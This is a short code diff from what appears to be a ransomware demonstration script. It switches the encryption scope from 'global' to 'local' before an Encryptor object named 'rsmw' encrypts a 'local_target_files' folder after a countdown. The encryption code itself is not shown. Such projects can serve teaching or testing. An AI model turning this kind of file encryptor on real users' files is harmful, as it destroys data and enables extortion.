@@ -8,7 +8,7 @@ for timeLeft in range(2):
     print(f"Will encrypt \"local_target_files\" folder in {2-timeLeft}sec")
     time.sleep(1)
 
-encryptionScope = "global"
+encryptionScope = "local"
 
 rsmw = Encryptor(encryptionScope)
 rsmw.FileEncryption()
